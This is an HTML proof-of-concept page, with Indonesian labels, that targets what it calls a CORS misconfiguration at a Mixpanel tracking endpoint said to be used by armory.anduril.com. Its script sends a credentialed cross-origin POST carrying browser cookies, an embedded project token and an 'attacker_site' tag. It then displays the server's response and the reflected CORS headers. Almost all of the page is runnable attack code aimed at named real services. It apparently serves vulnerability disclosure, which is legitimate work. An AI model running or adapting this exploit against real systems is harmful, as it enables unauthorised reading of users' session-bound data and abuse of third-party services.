<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC - Anduril Armory</title>
    <style>
        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
        #result { background: #f4f4f4; padding: 15px; border-left: 5px solid #2ecc71; overflow-x: auto; }
        .status { font-weight: bold; color: #e74c3c; }
    </style>
</head>
<body>
    <h1>Anduril Armory - CORS Misconfiguration</h1>
    <p>Domain: <code>api-js.mixpanel.com</code> (digunakan oleh armory.anduril.com)</p>
    <p>Status: <span id="status" class="status">Mengirim Request...</span></p>
    
    <h3>Data yang Berhasil Dibaca:</h3>
    <pre id="result">Menunggu response dari server...</pre>

    <script>
        // Endpoint yang rentan
        const targetUrl = "https://api-js.mixpanel.com/track/?verbose=1&ip=1";
        
        // Payload untuk memicu track event
        const payload = JSON.stringify([{
            "event": "poc_cors_exploit",
            "properties": {
                "token": "9a430771cc242d2e1a07a66b00d4c553", 
                "attacker_site": "fadhlur21.github.io"
            }
        }]);

        fetch(targetUrl, {
            method: "POST",
            mode: "cors",
            credentials: "include", // Mencoba membawa cookie/session browser
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "data=" + encodeURIComponent(payload)
        })
        .then(response => {
            const originHeader = response.headers.get("access-control-allow-origin");
            const credsHeader = response.headers.get("access-control-allow-credentials");
            
            console.log("Origin Reflected:", originHeader);
            console.log("Credentials Is Allowed:", credsHeader);
            
            document.getElementById("status").innerText = "Got you!!!!";
            document.getElementById("status").style.color = "#2ecc71";
            return response.json();
        })
        .then(data => {
            document.getElementById("result").innerText = JSON.stringify(data, null, 2);
        })
        .catch(err => {
            document.getElementById("status").innerText = "Failed (CORS Blocked)";
            document.getElementById("result").innerText = err;
        });
    </script>
</body>
</html>
